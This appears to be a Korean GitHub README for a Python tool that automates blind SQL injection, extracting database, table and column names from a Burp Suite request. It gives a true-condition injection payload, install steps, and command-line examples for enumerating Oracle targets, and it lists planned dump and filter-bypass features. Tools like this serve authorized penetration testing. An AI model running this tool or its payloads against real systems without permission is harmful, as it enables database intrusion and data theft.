# Blind SQL Injection 자동화 도구
**blind sqli 포인트 발견 시, BurpSuite 요청 데이터를 그대로 이용해서 데이터 출력 자동화**<br>
취약한 파라미터에 True 조건식 입력 후 Brup 요청 값을 그대로 REQUEST_STRING 변수에 추가 (URL Decode 필요없음)<br>
**ex)** True 조건식 : `' and 1=1 -- `<br>
  <img src="https://github.com/kazal92/blind_sqli/blob/main/images/request_string.png" alt="설명" style="width:60%;height:auto;"><br><br>
결과 데이터 Console에 텍스트로 출력되며 아래와 같이 .db 파일로도 저장 가능함<br>
<img src="https://github.com/kazal92/Code/blob/main/images/result_db.png" alt="설명" style="width:40%;height:auto;">

## HELP
```
usage: sqli.py [-h] [-s SCHEMA] [-p PARAMETER] [-d RESULT_DB] [-D SELECT_DB] [-T SELECT_TABLE] [-C SELECT_COLUMN] [--dbms DBMS] [--proxy PROXY] (--basic | --dbs | --tables | --columns)

optional arguments:
  -h, --help        show this help message and exit
  -s SCHEMA         http? https? EX) -s HTTP
  -p PARAMETER      target param -EX title
  -d RESULT_DB      Database name for storing results EX) -d result_db.db
  -D SELECT_DB      select DB EX) -D bWAPP
  -T SELECT_TABLE   select Table EX) -T 'USERS', 'EXAMPLE_TABLE' # 싱글쿼터 없어도됨
  -C SELECT_COLUMN  select Column EX) -C 'blog', 'heroes'# 싱글쿼터 없어도됨
  --dbms DBMS       SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL EX) oracle
  --proxy PROXY     Use a proxy to connect to the target URL EX) 127.0.0.1:8080
  --basic           Basic info extraction
  --dbs             Enumerate DBMS databases
  --tables          Enumerate Tables
  --columns         Enumerate columns
```
## 설치
```
git clone https://github.com/kazal92/blind_sqli.git  
pip install -r requirements.txt  
```
## 사용 예시
**기본 정보 추출:**  
`python sqli.py -s http --dbms oracle -p username -d oracle_result.db --basic `<br><br>
  <img src="https://github.com/kazal92/Code/blob/main/images/console_result_basic.png" alt="설명" style="width:80%;height:auto;"><br><br>
**DB 목록 추출:**  
`python sqli.py -s http --dbms oracle -p username -d oracle_result.db --dbs `<br><br>
<img src="https://github.com/kazal92/Code/blob/main/images/console_result_dbs.png" alt="설명" style="width:60%;height:auto;"><br><br>

**테이블 목록 추출:**  
`python sqli.py -s http --dbms oracle -p username -d oracle_result.db --tables -D C##KAZAL92`<br><br>
<img src="https://github.com/kazal92/Code/blob/main/images/console_result_tables.png" alt="설명" style="width:70%;height:auto;"><br><br>
**컬럼 목록 추출:**  
`python sqli.py -s http --dbms oracle -p username -d oracle_result.db --columns -D C##KAZAL92 -T "'USERS', 'EXAMPLE_TABLE'"`<br><br>
<img src="https://github.com/kazal92/Code/blob/main/images/console_result_columns.png" alt="설명" style="width:70%;height:auto;"><br><br>

## 추가될 기능
1. Request 입력한 파일 값 받아오기
2. DB, TABLE, COLUMN 외 데이터 출력 구현
3. 다른 데이터베이스 페이로드 생성 # !! MYSQL, ORACLE 완료
4. --dump 덤프 옵션 추가
5. 우회 패턴 추가
등등
